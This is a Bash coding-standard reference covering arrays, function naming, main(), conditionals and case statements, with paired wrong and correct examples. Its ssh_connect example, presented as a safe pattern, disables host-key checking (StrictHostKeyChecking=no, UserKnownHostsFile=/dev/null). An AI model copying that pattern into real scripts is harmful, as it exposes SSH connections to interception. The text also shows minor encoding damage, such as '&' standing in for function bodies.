**Rationale for `readarray -t`:** Removes trailing newlines (`-t`), uses process substitution to avoid subshell, handles filenames with spaces/newlines safely.

**Accessing elements:**

```bash
first=${array[0]}
last=${array[-1]}     # Last element (bash 4.3+)
"${array[@]}"         # Each element as separate word
"${array[@]:2}"       # Elements from index 2 onwards
"${array[@]:1:3}"     # 3 elements starting from index 1
```

**Modifying arrays:**

```bash
unset 'array[3]'                      # Remove element at index 3
unset 'array[${#array[@]}-1]'         # Remove last element
array[2]='new value'                  # Replace element
array=()                              # Clear entire array
```

**Practical patterns:**

```bash
# Collect arguments during parsing
declare -a input_files=()
while (($#)); do case $1 in
  -*)   handle_option "$1" ;;
  *)    input_files+=("$1") ;;
esac; shift; done

# Build command arguments dynamically
declare -a find_args=('-type' 'f')
((max_depth > 0)) && find_args+=('-maxdepth' "$max_depth")
find "${search_dir:-.}" "${find_args[@]}"
```

**Checking membership:**

```bash
has_element() {
  local search=$1; shift
  local element
  for element; do
    [[ "$element" == "$search" ]] && return 0
  done
  return 1
}

declare -a valid_options=('start' 'stop' 'restart')
has_element "$action" "${valid_options[@]}" || die 22 "Invalid action: $action"
```

**Critical anti-patterns:**

```bash
#  Wrong - unquoted expansion breaks with spaces
rm ${files[@]}

#  Correct
rm "${files[@]}"

#  Wrong - iterate values, not indices unless needed
for i in "${!array[@]}"; do echo "${array[$i]}"; done

#  Correct
for value in "${array[@]}"; do echo "$value"; done

#  Wrong - word splitting creates array (expands globs)
array=($string)

#  Correct
readarray -t array <<< "$string"

#  Wrong - array[*] iterates once with all items as single string
for item in "${array[*]}"; do echo "$item"; done

#  Correct - array[@] treats each element separately
for item in "${array[@]}"; do echo "$item"; done
```

**Array operator reference:**

| Operation | Syntax | Description |
|-----------|--------|-------------|
| Declare | `declare -a arr=()` | Create empty array |
| Append | `arr+=("value")` | Add element to end |
| Length | `${#arr[@]}` | Number of elements |
| All elements | `"${arr[@]}"` | Each element as separate word |
| Single element | `"${arr[i]}"` | Element at index i |
| Last element | `"${arr[-1]}"` | Last element (bash 4.3+) |
| Slice | `"${arr[@]:2:3}"` | 3 elements from index 2 |
| Unset element | `unset 'arr[i]'` | Remove element at index i |
| Indices | `"${!arr[@]}"` | All array indices |

**Key principle:** Always quote array expansions: `"${array[@]}"` to preserve spacing and prevent word splitting.


---


**Rule: BCS0502**

## Arrays for Safe List Handling

**Use arrays to store lists of elements safely, especially for command arguments, file lists, and any collection where elements may contain spaces, special characters, or wildcards. Arrays provide proper element boundaries and eliminate word splitting and glob expansion issues.**

**Rationale:**

- **Element Preservation**: Arrays maintain element boundaries regardless of content (spaces, newlines, special chars)
- **No Word Splitting**: Array elements don't undergo word splitting when expanded with `"${array[@]}"`
- **Glob Safety**: Wildcards in array elements are preserved literally
- **Safe Command Construction**: Build commands with arbitrary arguments safely
- **Iteration Safety**: Each element processed exactly once, all content preserved
- **Dynamic Lists**: Arrays can grow, shrink, and be modified without quoting complications

**Why arrays are safer than strings:**

```bash
#  DANGEROUS - String-based list
files_str="file1.txt file with spaces.txt file3.txt"

# Word splitting breaks this!
for file in $files_str; do
  echo "$file"
done
# Output: file1.txt, file, with, spaces.txt, file3.txt (5 iterations instead of 3!)
cmd $files_str  # Passes 5 arguments instead of 3!

#  SAFE - Array-based list
declare -a files=(
  'file1.txt'
  'file with spaces.txt'
  'file3.txt'
)

for file in "${files[@]}"; do
  echo "$file"
done
# Output: file1.txt, file with spaces.txt, file3.txt (3 iterations - correct!)
cmd "${files[@]}"  # Passes exactly 3 arguments
```

**Safe command argument construction:**

```bash
#  Building command with variable arguments
build_command() {
  local -- output_file="$1"
  local -i verbose="$2"

  local -a cmd=(
    'myapp'
    '--config' '/etc/myapp/config.conf'
    '--output' "$output_file"
  )

  ((verbose)) && cmd+=('--verbose')

  "${cmd[@]}"
}

build_command 'output file.txt' 1

#  Dynamic find command
search_files() {
  local -- search_dir="$1"
  local -- pattern="$2"

  local -a find_args=(
    "$search_dir"
    '-type' 'f'
  )

  [[ -n "$pattern" ]] && find_args+=('-name' "$pattern")

  find_args+=(
    '-mtime' '-7'
    '-size' '+1M'
  )

  find "${find_args[@]}"
}

#  SSH with conditional arguments
ssh_connect() {
  local -- host="$1"
  local -i use_key="$2"
  local -- key_file="$3"

  local -a ssh_args=(
    '-o' 'StrictHostKeyChecking=no'
    '-o' 'UserKnownHostsFile=/dev/null'
  )

  ((use_key)) && [[ -f "$key_file" ]] && ssh_args+=('-i' "$key_file")

  ssh_args+=("$host")
  ssh "${ssh_args[@]}"
}
```

**Safe file list handling:**

```bash
# Processing multiple files
process_files() {
  local -a files=(
    "$SCRIPT_DIR/data/file 1.txt"
    "$SCRIPT_DIR/data/report (final).pdf"
    "$SCRIPT_DIR/data/config.conf"
  )

  local -- file
  local -i processed=0

  for file in "${files[@]}"; do
    if [[ -f "$file" ]]; then
      info "Processing: $file"
      ((processed+=1))
    else
      warn "File not found: $file"
    fi
  done

  info "Processed $processed files"
}

# Gather files with globbing
gather_files() {
  local -- pattern="$1"
  local -a matching_files=("$SCRIPT_DIR"/$pattern)

  [[ ${#matching_files[@]} -eq 0 ]] && { error "No files matching: $pattern"; return 1; }

  for file in "${matching_files[@]}"; do
    info "File: $file"
  done
}

# Dynamic list building from find
collect_log_files() {
  local -- log_dir="$1"
  local -i max_age="$2"
  local -a log_files=()

  while IFS= read -r -d '' file; do
    log_files+=("$file")
  done < <(find "$log_dir" -name '*.log' -mtime "-$max_age" -print0)

  info "Collected ${#log_files[@]} log files"

  for file in "${log_files[@]}"; do
    process_log "$file"
  done
}
```

**Safe argument passing to functions:**

```bash
#  Correct - pass array to function
process_items() {
  local -a items=("$@")
  local -- item

  for item in "${items[@]}"; do
    info "Item: $item"
  done
}

declare -a my_items=(
  'item one'
  'item with "quotes"'
  'item with $special chars'
)

process_items "${my_items[@]}"
```

**Conditional array building:**

```bash
# Build array based on conditions
build_compiler_flags() {
  local -i debug="$1"
  local -i optimize="$2"

  local -a flags=('-Wall' '-Werror')

  ((debug)) && flags+=('-g' '-DDEBUG')

  if ((optimize)); then
    flags+=('-O2' '-DNDEBUG')
  else
    flags+=('-O0')
  fi

  printf '%s\n' "${flags[@]}"
}

# Capture into array
declare -a compiler_flags
readarray -t compiler_flags < <(build_compiler_flags 1 0)

gcc "${compiler_flags[@]}" -o myapp myapp.c
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -i VERBOSE=0
declare -i DRY_RUN=0

create_backup() {
  local -- source_dir="$1"
  local -- backup_dir="$2"

  local -a tar_args=(
    '-czf'
    "$backup_dir/backup-$(date +%Y%m%d).tar.gz"
    '-C' "${source_dir%/*}"
    "${source_dir##*/}"
  )

  ((VERBOSE)) && tar_args+=('-v')

  local -a exclude_patterns=('*.tmp' '*.log' '.git')

  local -- pattern
  for pattern in "${exclude_patterns[@]}"; do
    tar_args+=('--exclude' "$pattern")
  done

  if ((DRY_RUN)); then
    info '[DRY-RUN] Would execute:'
    printf '  %s\n' "${tar_args[@]}"
  else
    info 'Creating backup...'
    tar "${tar_args[@]}"
  fi
}

process_directories() {
  local -a directories=(
    "$HOME/Documents"
    "$HOME/Projects/my project"
    "$HOME/.config"
  )

  local -- dir
  local -i count=0

  for dir in "${directories[@]}"; do
    if [[ -d "$dir" ]]; then
      create_backup "$dir" '/backup'
      ((count+=1))
    else
      warn "Directory not found: $dir"
    fi
  done

  success "Backed up $count directories"
}

sync_files() {
  local -- source="$1"
  local -- destination="$2"

  local -a rsync_args=(
    '-av'
    '--progress'
    '--exclude' '.git/'
    '--exclude' '*.tmp'
  )

  ((DRY_RUN)) && rsync_args+=('--dry-run')

  rsync_args+=(
    "$source"
    "$destination"
  )

  info 'Syncing files...'
  rsync "${rsync_args[@]}"
}

main() {
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    *) die 22 "Invalid option: $1" ;;
  esac; shift; done

  readonly -- VERBOSE DRY_RUN

  process_directories
  sync_files "$HOME/data" '/backup/data'
}

main "$@"

#fin
```

**Anti-patterns:**

```bash
#  Wrong - string-based list causes word splitting
files_str="file1.txt file2.txt file with spaces.txt"
for file in $files_str; do process "$file"; done

#  Correct - array-based list
declare -a files=('file1.txt' 'file2.txt' 'file with spaces.txt')
for file in "${files[@]}"; do process "$file"; done

#  Wrong - string concatenation for commands
cmd_args="-o output.txt --verbose"
mycmd $cmd_args  # Word splitting issues

#  Correct - array for command arguments
declare -a cmd_args=('-o' 'output.txt' '--verbose')
mycmd "${cmd_args[@]}"

#  Wrong - eval with string concatenation
cmd="find $dir -name $pattern"
eval "$cmd"  # Dangerous!

#  Correct - array-based command
declare -a find_args=("$dir" '-name' "$pattern")
find "${find_args[@]}"

#  Wrong - IFS manipulation
IFS=','
for item in $csv_string; do echo "$item"; done
IFS=' '

#  Correct - array from IFS split
IFS=',' read -ra items <<< "$csv_string"
for item in "${items[@]}"; do echo "$item"; done

#  Wrong - parsing ls output
files=$(ls *.txt)
for file in $files; do process "$file"; done

#  Correct - glob into array
declare -a files=(*.txt)
for file in "${files[@]}"; do process "$file"; done

#  Wrong - unquoted array expansion
declare -a items=('a' 'b' 'c')
cmd ${items[@]}  # Word splitting!

#  Correct - quoted expansion
cmd "${items[@]}"
```

**Edge cases:**

**Empty arrays:**
```bash
declare -a empty=()

# Zero iterations - safe
for item in "${empty[@]}"; do
  echo "$item"  # Never executes
done

process_items "${empty[@]}"  # Function receives zero arguments
```

**Special characters:**
```bash
declare -a special=(
  'file with spaces.txt'
  'file"with"quotes.txt'
  'file$with$dollars.txt'
  'file*with*wildcards.txt'
  $'file\nwith\nnewlines.txt'
)

# All preserved safely
for file in "${special[@]}"; do
  echo "File: $file"
done
```

**Merging arrays:**
```bash
declare -a arr1=('a' 'b')
declare -a arr2=('c' 'd')

declare -a combined=(
  "${arr1[@]}"
  "${arr2[@]}"
)
```

**Removing duplicates:**
```bash
remove_duplicates() {
  local -a input=("$@")
  local -a output=()
  local -A seen=()
  local -- item

  for item in "${input[@]}"; do
    if [[ ! -v seen[$item] ]]; then
      output+=("$item")
      seen[$item]=1
    fi
  done

  printf '%s\n' "${output[@]}"
}

declare -a with_dupes=('a' 'b' 'a' 'c' 'b' 'd')
declare -a unique
readarray -t unique < <(remove_duplicates "${with_dupes[@]}")
echo "${unique[@]}"  # Output: a b c d
```

**Key principle:** Arrays are the safe, correct way to handle lists in Bash. String-based lists inevitably fail with edge cases (spaces, wildcards, special chars). Every list should be stored in an array and expanded with `"${array[@]}"`. This eliminates entire categories of bugs and makes scripts robust against unexpected input.


---


**Rule: BCS0600**

# Functions

This section defines function definition patterns, naming conventions (lowercase_with_underscores), and organization principles. It mandates the `main()` function for scripts exceeding 200 lines to improve structure and testability, explains function export for sourceable libraries (`declare -fx`), and details production optimization practices where unused utility functions should be removed once scripts mature. Functions should be organized bottom-up: messaging functions first, then helpers, then business logic, with `main()` lastâ€”this ensures each function can safely call previously defined functions and readers understand primitives before composition.


---


**Rule: BCS0601**

## Function Definition Pattern
```bash
# Single-line functions for simple operations
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }

# Multi-line functions with local variables
main() {
  local -i exitcode=0
  local -- variable
  # Function body
  return "$exitcode"
}
```


---


**Rule: BCS0602**

## Function Names
Use lowercase with underscores to match shell conventions and avoid conflicts with built-ins.

```bash
#  Good - lowercase with underscores
my_function() {
  &
}

process_log_file() {
  &
}

#  Private functions use leading underscore
_my_private_function() {
  &
}

#  Avoid - CamelCase or UPPER_CASE
MyFunction() {      # Don't do this
  &
}

PROCESS_FILE() {    # Don't do this
  &
}
```

**Rationale:**
- Lowercase with underscores matches Unix/Linux utility naming conventions
- Underscore prefix signals internal-only functions
- Avoids confusion with variables, commands, and bash built-ins

**Anti-patterns:**
```bash
#  Don't override built-in commands
cd() {
  builtin cd "$@" && ls
}

#  Use different name when wrapping built-ins
change_dir() {
  builtin cd "$@" && ls
}

#  Don't use dashes (creates issues)
my-function() {
  &
}
```


---


**Rule: BCS0603**

## Main Function

**Always include a `main()` function for scripts longer than approximately 200 lines. The main function serves as the single entry point, orchestrating the script's logic. Place `main "$@"` at the bottom of the script, just before the `#fin` marker.**

**Rationale:**

- **Single Entry Point**: Clear script execution flow from one well-defined function
- **Testability**: Scripts can be sourced for testing without executing; functions tested individually
- **Organization**: Separates initialization, argument parsing, and main logic into clear sections
- **Debugging**: Easy to add debugging output or dry-run logic in one central location
- **Scope Control**: All script execution variables can be local to main, preventing global namespace pollution
- **Exit Code Management**: Centralized return/exit code handling for consistent error reporting

**When to use main():**

```bash
# Use main() when:
# - Script is longer than ~200 lines
# - Script has multiple functions
# - Script requires argument parsing
# - Script needs to be testable

# Can skip main() when:
# - Script is trivial (< 200 lines)
# - Script is a simple wrapper
# - Script is linear (no branching)
```

**Basic main() structure:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Functions
# ============================================================================

# ... helper functions ...

# ============================================================================
# Main
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -h|--help) usage; return 0 ;;
    *) die 22 "Invalid option: $1" ;;
  esac; shift; done

  # Main logic
  info 'Starting processing...'

  # Return success
  return 0
}

# Script invocation
main "$@"

#fin
```

**Main function with argument parsing:**

```bash
main() {
  # Local variables for parsed options
  local -i verbose=0
  local -i dry_run=0
  local -- output_file=''
  local -a input_files=()

  # Parse arguments
  while (($#)); do case $1 in
    -v|--verbose) verbose=1 ;;
    -n|--dry-run) dry_run=1 ;;
    -o|--output)
      noarg "$@"
      shift
      output_file="$1"
      ;;
    -h|--help) usage; return 0 ;;
    --) shift; break ;;
    -*) die 22 "Invalid option: $1" ;;
    *) input_files+=("$1") ;;
  esac; shift; done

  # Remaining arguments after --
  input_files+=("$@")

  # Make parsed values readonly
  readonly -- verbose dry_run output_file
  readonly -a input_files

  # Validate arguments
  if [[ ${#input_files[@]} -eq 0 ]]; then
    error 'No input files specified'
    usage
    return 22
  fi

  # Main logic
  if ((verbose)); then
    info "Processing ${#input_files[@]} files"
    ((dry_run)) && info '[DRY-RUN] Mode enabled'
  fi

  # Process files
  local -- file
  for file in "${input_files[@]}"; do
    process_file "$file"
  done

  return 0
}
```

**Main function with setup/cleanup:**

```bash
# Cleanup function
cleanup() {
  local -i exit_code=$?

  # Cleanup operations
  if [[ -n "${TEMP_DIR:-}" && -d "$TEMP_DIR" ]]; then
    rm -rf "$TEMP_DIR"
  fi

  return "$exit_code"
}

main() {
  # Setup trap for cleanup
  trap cleanup EXIT

  # Create temp directory
  TEMP_DIR=$(mktemp -d)
  readonly -- TEMP_DIR

  # Main logic
  info "Using temp directory: $TEMP_DIR"

  # Cleanup happens automatically via trap
  return 0
}

main "$@"

#fin
```

**Main function with error handling:**

```bash
main() {
  local -i errors=0

  # Process items with error tracking
  local -- item
  for item in "${items[@]}"; do
    if ! process_item "$item"; then
      error "Failed to process: $item"
      ((errors+=1))
    fi
  done

  # Report results
  if ((errors > 0)); then
    error "Completed with $errors errors"
    return 1
  else
    success 'All items processed successfully'
    return 0
  fi
}
```

**Main function enabling sourcing for tests:**

```bash
# Script can be sourced for testing
main() {
  # ... script logic ...
  return 0
}

# Only execute main if script is run directly (not sourced)
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  main "$@"
fi

#fin
```

**Anti-patterns:**

```bash
#  Wrong - no main function in complex script
#!/bin/bash
set -euo pipefail
# ... 200 lines of code directly in script ...
# Hard to test, hard to organize

#  Correct - main function
#!/bin/bash
set -euo pipefail
# ... helper functions ...
main() {
  # Script logic
}
main "$@"
#fin

#  Wrong - main() not at end
main() { : ; }
main "$@"  # Called here
helper_function() { : ; }  # Defined after main executes!

#  Correct - main() at end, called last
helper_function() { : ; }
main() { : ; }  # Can call helper_function
main "$@"
#fin

#  Wrong - parsing arguments outside main
verbose=0
while (($#)); do : ; done
main() { : ; }  # Uses global variables
main "$@"  # Arguments already consumed!

#  Correct - parsing in main
main() {
  local -i verbose=0
  while (($#)); do : ; done
  readonly -- verbose
}
main "$@"

#  Wrong - not passing arguments
main() { : ; }
main  # Missing "$@"!

#  Correct - pass all arguments
main "$@"

#  Wrong - mixing global and local logic
total=0  # Global
main() {
  local -i count=0
  ((total+=count))  # Mixes global and local state
}

#  Correct - all logic in main
main() {
  local -i total=0
  local -i count=0
  ((total+=count))  # All local, clean scope
}
```

**Edge cases:**

**1. Script needs global configuration:**

```bash
# Global configuration (before functions)
declare -i VERBOSE=0
declare -i DRY_RUN=0

main() {
  # Parse arguments and modify globals
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
  esac; shift; done

  # Make globals readonly
  readonly -- VERBOSE DRY_RUN
}

main "$@"
```

**2. Script has initialization code:**

```bash
# Initialization before main
declare -A CONFIG=()
load_config() { : ; }
load_config  # Load before main

main() {
  echo "App: ${CONFIG[app_name]}"
}

main "$@"
```

**3. Script is library and executable (dual-purpose):**

```bash
# Library functions
utility_function() { : ; }

# Main function for when executed
main() { : ; }

# Only run main if executed (not sourced)
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  main "$@"
fi

#fin
```

**4. Multiple main scenarios:**

```bash
main_install() { : ; }
main_uninstall() { : ; }

main() {
  local -- mode="${1:-}"
  case "$mode" in
    install) shift; main_install "$@" ;;
    uninstall) shift; main_uninstall "$@" ;;
    *) die 22 "Invalid mode: $mode" ;;
  esac
}

main "$@"
```

**Summary:**

- **Use main() for scripts >200 lines** - provides organization and testability
- **Single entry point** - all execution flows through main()
- **Place main() at end** - define helpers first, main last
- **Always call with "$@"** - `main "$@"` to pass all arguments
- **Parse arguments in main** - keep argument handling in one place
- **Make locals readonly** - after parsing, make option variables readonly
- **Return appropriate code** - 0 for success, non-zero for errors
- **Consider sourcing** - use `[[ "${BASH_SOURCE[0]}" == "${0}" ]]` for testability

**Key principle:** The main() function is the orchestrator - it doesn't do the work, it coordinates it. All heavy lifting should be in helper functions. Main's job is to parse arguments, validate input, call the right functions in the right order, and return an appropriate exit code.


---


**Rule: BCS0604**

## Function Export
```bash
# Export functions when needed by subshells
grep() { /usr/bin/grep "$@"; }
find() { /usr/bin/find "$@"; }
declare -fx grep find
```


---


**Rule: BCS0605**

## Production Script Optimization
Once mature, remove unused elements:
- Unused utility functions (`yn()`, `decp()`, `trim()`, `s()`)
- Unused global variables (`PROMPT`, `DEBUG`)
- Unused messaging functions

Reduces size, improves clarity, eliminates maintenance burden.

Example: Simple scripts may only need `error()` and `die()`, not the full messaging suite.


---


**Rule: BCS0700**

# Control Flow

Establishes patterns for conditionals, loops, case statements, and arithmetic operations. Mandates `[[ ]]` over `[ ]` for tests, `(())` for arithmetic conditionals. Covers compact and expanded case statement formats. Critical: prefer process substitution (`< <(command)`) over pipes to while loops (avoids subshell variable persistence issues). Use safe arithmetic: `i+=1` or `((i+=1))` not `((i++))` (returns original value, fails with `set -e` when i=0).


---


**Rule: BCS0701**

## Conditionals

**Use `[[ ]]` for string/file tests, `(())` for arithmetic:**

```bash
# String and file tests - use [[ ]]
[[ -d "$path" ]] && echo 'Directory exists'
[[ -f "$file" ]] || die 1 "File not found: $file"
[[ "$status" == 'success' ]] && continue

# Arithmetic tests - use (())
((VERBOSE==0)) || echo 'Verbose mode'
((var > 5)) || return 1
((count >= MAX_RETRIES)) && die 1 'Too many retries'

# Complex conditionals - combine both
if [[ -n "$var" ]] && ((count > 0)); then
  process_data
fi

# Short-circuit evaluation
[[ -f "$file" ]] && source "$file"
((VERBOSE)) || return 0
```

**Rationale for `[[ ]]` over `[ ]`:**

1. **No word splitting or glob expansion** on variables
2. **Pattern matching** with `==` and `=~` operators
3. **Logical operators** `&&` and `||` work inside (no `-a` / `-o` needed)
4. **More operators**: `<`, `>` for string comparison (lexicographic)

**Comparison:**

```bash
var="two words"

#  [ ] requires quotes or fails
[ $var = "two words" ]  # ERROR: too many arguments

#  [[ ]] handles unquoted (but quote anyway)
[[ "$var" == "two words" ]]  # Recommended

# Pattern matching (only works in [[ ]])
[[ "$file" == *.txt ]] && echo "Text file"
[[ "$input" =~ ^[0-9]+$ ]] && echo "Number"

# Logical operators inside [[ ]]
[[ -f "$file" && -r "$file" ]] && cat "$file"

# vs [ ] requires separate tests
[ -f "$file" ] && [ -r "$file" ] && cat "$file"
```

**Arithmetic conditionals - use `(())`:**

```bash
#  Correct - natural C-style syntax
if ((count > 0)); then
  echo "Count: $count"
fi

((i >= MAX)) && die 1 'Limit exceeded'

#  Wrong - using [[ ]] for arithmetic (verbose)
if [[ "$count" -gt 0 ]]; then  # Unnecessary
  echo "Count: $count"
fi

# Operators: > >= < <= == !=
```

**Pattern matching:**

```bash
# Glob patterns
[[ "$filename" == *.@(jpg|png|gif) ]] && process_image "$filename"

# Regular expressions
if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
  echo "Valid email"
else
  die 22 "Invalid email: $email"
fi

# Case-insensitive (bash 3.2+)
shopt -s nocasematch
[[ "$input" == "yes" ]] && echo "Affirmative"  # Matches YES, Yes, yes
shopt -u nocasematch
```

**Anti-patterns:**

```bash
#  Wrong - old [ ] syntax
if [ -f "$file" ]; then  # Use [[ ]] instead
  echo "Found"
fi

#  Wrong - deprecated -a and -o
[ -f "$file" -a -r "$file" ]  # Fragile

#  Correct
[[ -f "$file" && -r "$file" ]]

#  Wrong - unquoted with [ ]
[ $var = "value" ]  # Breaks if var contains spaces

#  Correct
[[ "$var" == "value" ]]

#  Wrong - arithmetic with [[ ]]
[[ "$count" -gt 10 ]]  # Verbose

#  Correct
((count > 10))
```

**File test operators (use with `[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-e file` | File exists |
| `-f file` | Regular file |
| `-d dir` | Directory |
| `-r file` | Readable |
| `-w file` | Writable |
| `-x file` | Executable |
| `-s file` | Not empty (size > 0) |
| `-L link` | Symbolic link |
| `file1 -nt file2` | file1 newer than file2 |
| `file1 -ot file2` | file1 older than file2 |

**String test operators (use with `[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-z "$str"` | String is empty (zero length) |
| `-n "$str"` | String is not empty |
| `"$a" == "$b"` | Strings are equal |
| `"$a" != "$b"` | Strings are not equal |
| `"$a" < "$b"` | Lexicographic less than |
| `"$a" > "$b"` | Lexicographic greater than |
| `"$str" =~ regex` | String matches regex |
| `"$str" == pattern` | String matches glob pattern |


---


**Rule: BCS0702**

## Case Statements

**Use `case` statements for multi-way branching based on pattern matching. Choose compact format for simple single-action cases, expanded format for multi-line logic.**

**Rationale:**
- Clearer and faster than if/elif chains for pattern-based branching with single variable
- Native pattern matching: wildcards, alternation, character classes
- Perfect for argument parsing and file type routing
- Default `*)` ensures exhaustive handling

**Case vs if/elif:**

```bash
#  Case - single variable, multiple patterns
case "$action" in
  start) start_service ;;
  stop) stop_service ;;
  restart) restart_service ;;
  *) die 22 "Invalid action: $action" ;;
esac

#  Case - pattern matching
case "$filename" in
  *.txt) process_text ;;
  *.pdf) process_pdf ;;
  *) die 22 "Unsupported type" ;;
esac

#  If/elif - different variables or complex logic
if [[ ! -f "$file" ]]; then
  die 2 "File not found"
elif [[ ! -r "$file" ]]; then
  die 1 "Not readable"
fi

#  If/elif - numeric ranges
if ((value < 0)); then
  error='negative'
elif ((value <= 10)); then
  category='small'
fi
```

**Compact format** (simple single-action cases):

```bash
# Guidelines: actions on same line, align ;; at consistent column (14-18)
while (($#)); do
  case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -f|--force)   FORCE=1 ;;
    -h|--help)    usage; exit 0 ;;
    -V|--version) echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -o|--output)  noarg "$@"; shift; OUTPUT_FILE="$1" ;;
    --)           shift; break ;;
    -*)           die 22 "Invalid option: $1" ;;
    *)            INPUT_FILES+=("$1") ;;
  esac
  shift
done
```

**Expanded format** (multi-line actions):

```bash
# Guidelines: actions on next line indented, ;; on separate line, blank line separator
while (($#)); do
  case $1 in
    -b|--builtin)     INSTALL_BUILTIN=1
                      ((VERBOSE)) && info 'Builtin enabled'
                      ;;

    -p|--prefix)      noarg "$@"
                      shift
                      PREFIX="$1"
                      BIN_DIR="$PREFIX/bin"
                      ((VERBOSE)) && info "Prefix: $PREFIX"
                      ;;

    -h|--help)        usage
                      exit 0
                      ;;

    -*)               error "Invalid option: $1"
                      usage
                      exit 22
                      ;;
  esac
  shift
done
```

**Pattern matching syntax:**

```bash
# 1. Literal patterns (unquoted)
case "$value" in
  start) echo 'Starting' ;;
  stop) echo 'Stopping' ;;
esac

# 2. Wildcards
case "$filename" in
  *.txt) echo 'Text' ;;
  *.pdf) echo 'PDF' ;;
  ??) echo 'Two-char code' ;;
  /usr/*) echo 'System path' ;;
esac

# 3. Alternation (OR patterns)
case "$option" in
  -h|--help|help) usage ;;
  *.txt|*.md|*.rst) process_text ;;
esac

# 4. Character classes (with extglob)
shopt -s extglob
case "$input" in
  ?(pattern))  # zero or one
  *(pattern))  # zero or more
  +(pattern))  # one or more
  @(start|stop|restart))  # exactly one
  !(*.tmp|*.bak))  # anything except
  [0-9]) echo 'Digit' ;;
  [a-z]) echo 'Lowercase' ;;
  [!a-zA-Z0-9]) echo 'Special char' ;;
esac
```

**File type routing:**

```bash
process_file_by_type() {
  local -- file="$1"
  local -- filename="${file##*/}"

  case "$filename" in
    *.txt|*.md|*.rst)
      process_text "$file"
      ;;

    *.jpg|*.jpeg|*.png|*.gif)
      process_image "$file"
      ;;

    *.sh|*.bash)
      validate_script "$file"
      ;;

    .*)
      warn "Skipping hidden: $file"
      ;;

    *.tmp|*.bak|*~)
      warn "Skipping temp: $file"
      ;;

    *)
      error "Unknown type: $file"
      return 1
      ;;
  esac
}
```

**Service control routing:**

```bash
main() {
  local -- action="${1:-}"
  [[ -z "$action" ]] && die 22 'No action specified'

  case "$action" in
    start)   start_service ;;
    stop)    stop_service ;;
    restart) restart_service ;;
    status)  status_service ;;
    reload)  reload_service ;;
    st|stat) status_service ;;  # Common aliases
    *)       die 22 "Invalid action: $action" ;;
  esac
}
```

**Anti-patterns:**

```bash
#  Quoting literal patterns
case "$value" in
  "start") ;;  # Wrong - don't quote
esac

#  Correct
case "$value" in
  start) ;;
esac

#  Not quoting test variable
case $filename in  # Wrong - quote variable!
  *.txt) ;;
esac

#  Correct
case "$filename" in
  *.txt) ;;
esac

#  Missing default case
case "$action" in
  start) start_service ;;
  stop) stop_service ;;
esac  # What if restart?

#  Always include default
case "$action" in
  start) start_service ;;
  stop) stop_service ;;
  *) die 22 "Invalid: $action" ;;
esac

#  Inconsistent format mixing
case $1 in
  -v) VERBOSE=1 ;;
  -o) shift
      OUTPUT="$1"
      ;;  # Mixing compact/expanded
esac

#  Pick one format consistently
case $1 in
  -v) VERBOSE=1 ;;
  -o) shift; OUTPUT="$1" ;;
esac

#  Poor alignment
case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -n|--dry-run) DRY_RUN=1 ;;
  -f|--force) FORCE=1 ;;  # Inconsistent
esac

#  Consistent columns
case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -n|--dry-run) DRY_RUN=1 ;;
  -f|--force)   FORCE=1 ;;
esac

#  Pattern grouping doesn't fall through (Bash limitation)
case "$code" in
  200|201|204)
    success='true'  # This works correctly
  300|301)  # But Bash doesn't fall through like C
    redirect='true'
    ;;
esac

#  Explicit grouping
case "$code" in
  200|201|204) success='true' ;;
  300|301) redirect='true' ;;
esac
```

**Edge cases:**

```bash
# Empty string handling
case "$value" in
  '') echo 'Empty' ;;
  *) echo "Value: $value" ;;
esac

# Special characters (quote patterns)
case "$filename" in
  'file (1).txt') echo 'Parentheses' ;;
  'file$special.txt') echo 'Dollar sign' ;;
esac

# Numeric patterns (string comparison)
case "$port" in
  80|443) echo 'Web port' ;;
  [0-9][0-9][0-9][0-9]) echo 'Four digits' ;;
esac
# For numeric comparison use (())

# Case in functions with return codes
validate_input() {
  local -- input="$1"
  case "$input" in
    [a-z]*) return 0 ;;
    [A-Z]*) warn 'Should be lowercase'; return 1 ;;
    [0-9]*) error 'No leading digit'; return 2 ;;
    '') error 'Empty'; return 22 ;;
    *) error 'Invalid'; return 1 ;;
  esac
}

# Multi-level routing
main() {
  local -- action="$1"; shift
  case "$action" in
    user) handle_user_commands "$@" ;;
    group) handle_group_commands "$@" ;;
    *) die 22 "Invalid: $action" ;;
  esac
}

handle_user_commands() {
  local -- cmd="$1"; shift
  case "$cmd" in
    add) add_user "$@" ;;
    delete) delete_user "$@" ;;
    list) list_users ;;
    *) die 22 "Invalid user cmd: $cmd" ;;
  esac
}
```

**Summary:**
- Use case for pattern matching single variable against multiple values
- Compact format: single-line actions, aligned `;;`
- Expanded format: multi-line actions, `;;` on separate line
- Always quote test variable: `case "$var" in`
- Don't quote literal patterns: `start)` not `"start")`
- Include default `*)` case for unexpected values
- Use alternation: `pattern1|pattern2)`
- Enable extglob for advanced patterns: `@()`, `!()`, `+()`, `*()`
- Prefer case over if/elif for single-variable tests
